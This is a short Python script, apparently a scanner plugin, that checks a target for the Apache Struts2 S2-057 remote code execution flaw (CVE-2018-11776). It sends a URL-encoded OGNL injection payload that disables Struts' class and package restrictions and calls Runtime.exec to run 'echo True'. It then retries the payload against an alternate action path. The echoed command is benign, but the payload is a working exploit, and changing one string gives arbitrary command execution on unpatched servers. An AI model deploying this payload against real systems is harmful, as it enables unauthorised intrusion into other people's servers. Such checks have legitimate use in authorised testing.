import urllib.request
from urllib.parse import urlparse

name = 'Apache Struts2 S2-057 远程代码执行漏洞 (CVE-2018-11776)'


def run(url):
    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    host = urlparse(url)
    url = f"{host.scheme}://{host.netloc}"
    try:
        payload = """%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20True%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D"""
        vulurl = url + '/' + payload + host.path
        response = urllib.request.urlopen(vulurl).geturl()
        if 'True' in response and 'echo' not in response:
            return ['True',name,vulurl.replace(payload+'/','')]
        else:
            try:
                vulurl = url + '/' + payload + '/actionChain1.action'
                response = urllib.request.urlopen(vulurl).geturl()
                if 'True' in response and 'echo' not in response:
                    return ['True',name,vulurl.replace(payload+'/','')]
                else:
                    return ['False',name]
            except Exception as e:
                return ['False',name]
    except Exception as e:
        return ['False',name]

if __name__ == '__main__':
    url = ''
    print(run(url))